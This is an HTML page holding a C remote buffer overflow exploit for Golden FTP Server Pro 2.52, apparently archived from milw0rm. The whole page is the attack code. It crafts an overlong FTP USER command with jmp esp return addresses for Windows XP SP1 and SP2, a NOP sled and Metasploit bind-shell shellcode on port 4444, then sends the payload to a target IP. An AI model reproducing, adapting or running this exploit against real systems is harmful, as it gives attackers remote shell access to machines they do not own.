<html>
<head>
<title>Golden FTP Server Pro 2.52 Remote Buffer Overflow Exploit</title>
<pre>
/*
*
* Golden FTP Server Pro Remote Buffer Overflow Exploit
* Bug Discovered by Reed Arvin (http://reedarvin.thearvins.com)
* Exploit coded By ATmaCA
* Web: atmacasoft.com &amp;&amp; spyinstructors.com
* E-Mail: atmaca@icqmail.com
* Credit to kozan and metasploit
* Usage:exploit &lt;targetOs&gt; &lt;targetIp&gt;
*
*/

/*
*
* Vulnerable Versions:
* Golden FTP Server Pro v2.52
*
* Exploit:
* Run the exploit against the server. Afterward, right
* click on the Golden FTP Server Pro icon in the Windows tray and click
* Statistic.
* It will open bind shell on port 4444
*
*/

#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

#pragma comment(lib, &quot;ws2_32.lib&quot;)

char userreq[] =
&quot;USER &quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;

char *target[]=  //return addr
{
       &quot;\xFC\x18\xD7\x77&quot;,   //WinXp Sp1 Eng - jmp esp addr
       &quot;\xBF\xAC\xDA\x77&quot;    //WinXp Sp2 Eng - jmp esp addr
};

char shellcode[] =
/* win32_bind -  EXITFUNC=seh LPORT=4444 Size=348 Encoder=PexFnstenvSub http://metasploit.com */
&quot;\x31\xc9\x83\xe9\xaf\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x82&quot;
&quot;\x2a\x64\x94\x83\xeb\xfc\xe2\xf4\x7e\x40\x8f\xdb\x6a\xd3\x9b\x6b&quot;
&quot;\x7d\x4a\xef\xf8\xa6\x0e\xef\xd1\xbe\xa1\x18\x91\xfa\x2b\x8b\x1f&quot;
&quot;\xcd\x32\xef\xcb\xa2\x2b\x8f\x77\xb2\x63\xef\xa0\x09\x2b\x8a\xa5&quot;
&quot;\x42\xb3\xc8\x10\x42\x5e\x63\x55\x48\x27\x65\x56\x69\xde\x5f\xc0&quot;
&quot;\xa6\x02\x11\x77\x09\x75\x40\x95\x69\x4c\xef\x98\xc9\xa1\x3b\x88&quot;
&quot;\x83\xc1\x67\xb8\x09\xa3\x08\xb0\x9e\x4b\xa7\xa5\x42\x4e\xef\xd4&quot;
&quot;\xb2\xa1\x24\x98\x09\x5a\x78\x39\x09\x6a\x6c\xca\xea\xa4\x2a\x9a&quot;
&quot;\x6e\x7a\x9b\x42\xb3\xf1\x02\xc7\xe4\x42\x57\xa6\xea\x5d\x17\xa6&quot;
&quot;\xdd\x7e\x9b\x44\xea\xe1\x89\x68\xb9\x7a\x9b\x42\xdd\xa3\x81\xf2&quot;
&quot;\x03\xc7\x6c\x96\xd7\x40\x66\x6b\x52\x42\xbd\x9d\x77\x87\x33\x6b&quot;
&quot;\x54\x79\x37\xc7\xd1\x79\x27\xc7\xc1\x79\x9b\x44\xe4\x42\x75\xc8&quot;
&quot;\xe4\x79\xed\x75\x17\x42\xc0\x8e\xf2\xed\x33\x6b\x54\x40\x74\xc5&quot;
&quot;\xd7\xd5\xb4\xfc\x26\x87\x4a\x7d\xd5\xd5\xb2\xc7\xd7\xd5\xb4\xfc&quot;
&quot;\x67\x63\xe2\xdd\xd5\xd5\xb2\xc4\xd6\x7e\x31\x6b\x52\xb9\x0c\x73&quot;
&quot;\xfb\xec\x1d\xc3\x7d\xfc\x31\x6b\x52\x4c\x0e\xf0\xe4\x42\x07\xf9&quot;
&quot;\x0b\xcf\x0e\xc4\xdb\x03\xa8\x1d\x65\x40\x20\x1d\x60\x1b\xa4\x67&quot;
&quot;\x28\xd4\x26\xb9\x7c\x68\x48\x07\x0f\x50\x5c\x3f\x29\x81\x0c\xe6&quot;
&quot;\x7c\x99\x72\x6b\xf7\x6e\x9b\x42\xd9\x7d\x36\xc5\xd3\x7b\x0e\x95&quot;
&quot;\xd3\x7b\x31\xc5\x7d\xfa\x0c\x39\x5b\x2f\xaa\xc7\x7d\xfc\x0e\x6b&quot;
&quot;\x7d\x1d\x9b\x44\x09\x7d\x98\x17\x46\x4e\x9b\x42\xd0\xd5\xb4\xfc&quot;
&quot;\x72\xa0\x60\xcb\xd1\xd5\xb2\x6b\x52\x2a\x64\x94&quot;;

char nops[] =
&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;;

char passreq[] =
&quot;PASS \r\n&quot;;

void main(int argc, char *argv[])
{
        WSADATA wsaData;
        WORD wVersionRequested;
        struct hostent  *pTarget;
        struct sockaddr_in 	sock;
        SOCKET mysocket;
        char rec[1024];

        if (argc &lt; 3)
        {
                printf(&quot;\r\nGolden FTP Server Pro Remote Buffer Overflow Exploit\r\n&quot;,argv[0]);
                printf(&quot;Bug Discovered by Reed Arvin (http://reedarvin.thearvins.com)\r\n&quot;);
                printf(&quot;Exploit coded By ATmaCA\r\n&quot;);
                printf(&quot;Web: atmacasoft.com &amp;&amp; spyinstructors.com\r\n&quot;);
                printf(&quot;Credit to kozan and metasploit\r\n&quot;);
                printf(&quot;Usage:\r\nexploit &lt;targetOs&gt; &lt;targetIp&gt;\r\n\r\n&quot;,argv[0]);
                printf(&quot;Targets:\n&quot;);
                printf(&quot;1 - WinXP SP1 english\n&quot;);
                printf(&quot;2 - WinXP SP2 english\n&quot;);
                printf(&quot;Example:exploit 2 127.0.0.1\n&quot;);

                return;
       }
       int targetnum = atoi(argv[1]) - 1;

       char *evilbuf = (char*)malloc(sizeof(userreq)+sizeof(shellcode)+sizeof(nops)
                                +sizeof(passreq)+7);
       strcpy(evilbuf,userreq);
       strcat(evilbuf,target[targetnum]);
       strcat(evilbuf,nops);
       strcat(evilbuf,shellcode);
       strcat(evilbuf,&quot;\r\n&quot;);
       strcat(evilbuf,passreq);
       //printf(&quot;%s&quot;,evilbuf);

       wVersionRequested = MAKEWORD(1, 1);
       if (WSAStartup(wVersionRequested, &amp;wsaData) &lt; 0) return;



       mysocket = socket(AF_INET, SOCK_STREAM, 0);
       if(mysocket==INVALID_SOCKET){
                  printf(&quot;Socket error!\r\n&quot;);
                  exit(1);
       }

       printf(&quot;Resolving Hostnames...\n&quot;);
       if ((pTarget = gethostbyname(argv[2])) == NULL){
                  printf(&quot;Resolve of %s failed\n&quot;, argv[1]);
                  exit(1);
       }

       memcpy(&amp;sock.sin_addr.s_addr, pTarget-&gt;h_addr, pTarget-&gt;h_length);
       sock.sin_family = AF_INET;
       sock.sin_port = htons(21);

       printf(&quot;Connecting...\n&quot;);
       if ( (connect(mysocket, (struct sockaddr *)&amp;sock, sizeof (sock) ))){
                  printf(&quot;Couldn't connect to host.\n&quot;);
                  exit(1);
       }

       printf(&quot;Connected!...\n&quot;);
       printf(&quot;Waiting for welcome message...\n&quot;);
       Sleep(10);
       recv(mysocket,rec,1024,0);

       printf(&quot;Sending evil request...\n&quot;);
       if (send(mysocket,evilbuf, strlen(evilbuf)+1, 0) == -1){
                  printf(&quot;Error Sending evil request.\r\n&quot;);
                  closesocket(mysocket);
                  exit(1);
       }

       Sleep(10);
       printf(&quot;Success.\n&quot;);
       closesocket(mysocket);
       WSACleanup();
}

// milw0rm.com [2005-04-29]
</pre>
</html>

